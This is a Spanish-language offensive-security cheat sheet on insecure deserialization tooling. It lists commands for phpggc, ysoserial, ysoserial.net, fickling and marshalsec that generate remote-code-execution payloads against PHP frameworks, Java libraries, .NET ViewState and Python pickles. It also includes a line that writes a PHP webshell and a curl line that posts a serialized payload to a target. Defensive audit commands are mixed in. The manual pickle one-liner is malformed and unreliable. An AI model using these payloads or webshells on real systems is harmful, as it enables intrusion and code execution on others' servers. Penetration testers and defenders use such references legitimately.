---
aliases:
  - phpggc
  - ysoserial
  - ysoserial.net
  - fickling
  - marshalsec
tags:
  - vuln/insecure-deser
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Insecure Deserialization]]"
---
# Insecure Deserialization - Tooling

---

## phpggc (PHP)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/ambionics/phpggc && cd phpggc` | Instalación | PHP CLI. |
| `./phpggc -l` | Listar gadgets | Muestra todos los chains disponibles por framework. |
| `./phpggc -l Monolog` | Filtrar por framework | Solo Monolog (logger). |
| `./phpggc Monolog/RCE1 system "id"` | Generar RCE Monolog | Output: serializado PHP. |
| `./phpggc Laravel/RCE9 system "id"` | Generar para Laravel | Frameworks comunes. |
| `./phpggc WordPress/RCE1 system "id"` | Generar para WordPress | WP gadget chain. |
| `./phpggc Symfony/RCE1 system "id"` | Generar para Symfony | Symfony chains. |
| `./phpggc -b Monolog/RCE1 system "id"` | Output base64 | Ya base64 encoded. |
| `./phpggc -u Monolog/RCE1 system "id"` | Output url-encoded | Para inyectar en GET. |
| `./phpggc -ud Monolog/RCE1 system "id"` | Output JSON-safe | Doble encoding url. |
| `./phpggc -p phar -pj polyglot.jpg Monolog/RCE1 system "id" -o evil.phar` | Wrap en Phar | Phar polyglot — para LFI + Phar. |
| `./phpggc Guzzle/FW1 /var/www/html/sh.php '<?=\`$_GET[c]\`?>'` | File write | Escribir webshell. |
| `./phpggc -t -p phar Monolog/RCE1 system "id"` | Test gadget | Verifica que funciona en stack PHP local. |
^deser-tool-phpggc

---

## ysoserial (Java)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar` | Descargar JAR | Releases oficiales. |
| `java -jar ysoserial-all.jar` | Listar gadgets | Lista todos los chains. |
| `java -jar ysoserial-all.jar URLDNS "http://canary.oast.fun/" \| base64 -w0` | Generar URLDNS (probe) | Canary sin RCE. |
| `java -jar ysoserial-all.jar CommonsCollections5 "id"` | CommonsCollections1-7 | Apache Commons Collections. |
| `java -jar ysoserial-all.jar CommonsBeanutils1 "id"` | CommonsBeanutils | Spring + Beanutils. |
| `java -jar ysoserial-all.jar Spring1 "id"` | Spring1/Spring2 | Spring framework. |
| `java -jar ysoserial-all.jar Hibernate1 "id"` | Hibernate1 | Hibernate ORM. |
| `java -jar ysoserial-all.jar JBossInterceptors1 "id"` | JBossInterceptors1 | JBoss EAP. |
| `java -jar ysoserial-all.jar Groovy1 "id"` | Groovy1 | Groovy en classpath. |
| `java -jar ysoserial-all.jar MozillaRhino1 "id"` | MozillaRhino1 | Rhino JS engine. |
| `java -jar ysoserial-all.jar ROME "id"` | ROME (Apache) | RSS feed lib. |
| `java -jar ysoserial-all.jar CommonsCollections5 "id" > rce.bin` | Output binary directo | Sin base64. |
| `curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @rce.bin https://target/` | Combinar con curl | Direct POST. |
| `https://github.com/wh1t3p1g/ysoserial` (fork) | Modified ysoserial (con más gadgets) | Más chains modernos. |
^deser-tool-ysoserial

---

## ysoserial.net (.NET)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `https://github.com/pwntester/ysoserial.net/releases` | Descargar | Windows binary. |
| `ysoserial.net.exe --list` | Listar gadgets | Gadgets + formatters. |
| `ysoserial.net.exe --formatter-list` | Listar formatters | Formats: BinaryFormatter, LosFormatter, etc. |
| `ysoserial.net.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc"` | TextFormattingRunProperties | Default reliable. |
| `ysoserial.net.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"` | TypeConfuseDelegate | Bypass de filtros. |
| `ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"` | ObjectDataProvider | Para JSON.NET. |
| `ysoserial.net.exe -g WindowsClaimsIdentity -f BinaryFormatter -c "calc"` | WindowsClaimsIdentity | .NET Framework 4.7+. |
| `ysoserial.net.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path="/test.aspx" --apppath="/"` | ViewState exploit (no MAC) | Sin validation key. |
| `--validationkey=<hex> --validationalg=SHA1 --decryptionkey=<hex> --decryptionalg=AES` | ViewState con validation key | Con keys del web.config. |
| `--output=base64` | Output base64 | Default. |
| `--output=raw > payload.bin` | Output raw | Sin encoding. |
| `--output=urlencoded` | Output URL-encoded | Para POST forms. |
| `--test --plugin=...` | TestPlugin | Verifica que funciona local. |
^deser-tool-ysoserialnet

---

## fickling (Python pickle)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `pip install fickling` | Instalación | Análisis + exploit pickle. |
| `fickling --check evil.pkl` | Análisis estático | Detecta opcodes peligrosos sin ejecutar. |
| `fickling --decompile evil.pkl` | Decompile | Reconstruye Python equivalente. |
| `fickling --trace evil.pkl` | Trace ejecución | Simula sin ejecutar opcodes peligrosos. |
| `fickling --inject 'os.system("id")' benign.pkl > evil.pkl` | Inyectar en pickle existente | Injection en archivo legítimo. |
| `fickling --create 'os.system("id")' evil.pkl` | Crear pickle malicioso | Desde cero. |
| `fickling --create 'os.system("id")' - \| base64 -w0` | Output base64 | Stdout + b64. |
| `fickling install --hook-strict` | Hook unsafe sinks | Globally hookea pickle.loads para safety. |
| `fickling --decompile model.joblib` | Force-decompile model ML | Auditar models pickle. |
| `python3 -c "import pickle, os; class E: ___ def __reduce__(self): return (os.system, ('id',)); print(pickle.dumps(E()))"` | Manual con pickle | Sin tool externa. |
^deser-tool-fickling

---

## Otros tools

| **Tool** | **Lenguaje / Formato** | **Uso** |
|:---:|:---:|:---:|
| `marshalsec` | XStream / SnakeYAML / Jackson / Hessian / Burlap / RMI / JBoss / etc | `java -jar marshalsec.jar Jackson "<gadget>" "<cmd>"` |
| `JNDI-Injection-Exploit` | RMI/LDAP servers para chain con deser | LDAP/RMI listener para Log4Shell-style. |
| `JNDIExploit` (welk1n fork) | RMI/LDAP server alt | Más gadgets. |
| `gadgetinspector` | Análisis estático de classpath Java | Encuentra gadgets nuevos. |
| `freddy` | Burp extension auto-detección deser | Pasivo en historial. |
| `Java Deserialization Scanner` | Burp extension active scanning | Probe de gadgets en endpoints. |
| `ViewState YSO Generator` | Web UI para ViewState | https://github.com/0xACB/viewgen |
| `viewgen` | CLI para ViewState | Alternativa a ysoserial.net solo para ViewState. |
| `pickleinspector` | Audit pickle | Análogo a fickling, menos features. |
| `node-deser-checker` | Audit Node.js | Detecta uso de node-serialize. |
| `awesome-fastjson` | Repo con gadgets FastJson | https://github.com/safe6Sec/Fastjson |
^deser-tool-others

---
